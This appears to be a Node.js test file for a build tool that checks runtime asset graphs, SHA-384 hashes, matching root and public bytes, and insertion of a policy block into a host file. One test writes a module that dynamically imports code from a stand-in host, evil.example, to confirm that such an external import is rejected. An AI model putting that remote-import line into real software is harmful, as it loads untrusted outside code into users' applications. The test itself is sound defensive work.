'use strict';
const assert = require('node:assert/strict');
const { test } = require('node:test');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const { createHash } = require('node:crypto');
const builder = require('../build_runtime_graph_delivery_policy.cjs');
function fixture(run) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'allo-runtime-builder-'));
  const write = (file, bytes) => { fs.mkdirSync(path.dirname(path.join(root, file)), { recursive: true }); fs.writeFileSync(path.join(root, file), bytes); };
  try {
    for (const file of builder.SOURCES) write(file, fs.readFileSync(path.join(builder.ROOT, file)));
    const bytes = Buffer.from('export const answer=42;'), asset = { kind: 'module', path: 'runtime_assets/test/entry.mjs', bytes: bytes.length,
      sha384: createHash('sha384').update(bytes).digest('hex'), mirrors: [], closed: true };
    const manifest = { schemaVersion: 1, assets: { entry: asset }, graphs: { fixture: { assets: ['entry'], entry: 'entry' } } };
    builder.CATALOGS.forEach((file, index) => write(file, JSON.stringify(index === 0 ? manifest : { schemaVersion: 1, assets: {}, graphs: {} })));
    write(asset.path, bytes); write('desktop/web-app/public/' + asset.path, bytes);
    run({ root, write, manifest, asset, bytes });
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}
test('all actual runtime graphs validate exact root/public assets and closed module imports', () => {
  const result = builder.assertRuntimeAssets(); assert.equal(Object.keys(result.manifest.graphs).length, 8); assert.equal(result.records.length, 36);
});
test('runtime policy identity binds code, host adapter and graph metadata', () => fixture(({ root, manifest, write }) => {
  const before = builder.policyId(manifest, root); write('runtime_graph_host.js', fs.readFileSync(path.join(root, 'runtime_graph_host.js'), 'utf8') + '\n// changed behavior\n');
  assert.notEqual(before, builder.policyId(manifest, root)); manifest.assets.entry.aliases = ['logical']; assert.notEqual(before, builder.policyId(manifest, root));
}));
test('modified public bytes block approval even when the root record matches', () => fixture(({ root, write, asset }) => {
  write('desktop/web-app/public/' + asset.path, 'other agent content'); assert.throws(() => builder.assertRuntimeAssets({ root }), /Root\/public runtime bytes differ/);
}));
test('a self-asserted closed module with an external child import is rejected', () => fixture(({ root, write, asset, manifest }) => {
  const bytes = Buffer.from('import("https://evil.example/child.js");'); asset.bytes = bytes.length; asset.sha384 = createHash('sha384').update(bytes).digest('hex');
  write(builder.CATALOGS[0], JSON.stringify(manifest)); write(asset.path, bytes); write('desktop/web-app/public/' + asset.path, bytes);
  assert.throws(() => builder.assertRuntimeAssets({ root }), /import/i);
}));
test('host insertion preserves surrounding concurrent edits and rejects ambiguous blocks', () => fixture(({ root, manifest }) => {
  const block = builder.buildBlock(manifest, root), source = "import React from 'react';\n// END ALLOFLOW_OPTIONAL_BROWSER_DELIVERY_POLICY\nif (typeof window !== 'undefined' && typeof document !== 'undefined') { userChange(); }";
  const after = builder.replaceBlock(source, block); assert(after.endsWith(' { userChange(); }')); assert.equal(builder.replaceBlock(after, block), after);
  assert.throws(() => builder.replaceBlock(after + '\n' + block, block), /Ambiguous/);
}));
test('built graph assets and compiled host identity are mandatory', () => fixture(({ root, write, manifest, asset }) => {
  write('AlloFlowANTI.txt', builder.buildBlock(manifest, root)); write('build/' + asset.path, fs.readFileSync(path.join(root, asset.path)));
  write('build/index.html', '<script src="./static/js/main.abc123.js"></script>'); write('build/static/js/main.abc123.js', 'old host');
  assert.throws(() => builder.assertRuntimeHost({ root, hostFile: 'AlloFlowANTI.txt', buildDir: path.join(root, 'build') }), /Compiled runtime graph policy is stale/);
}));
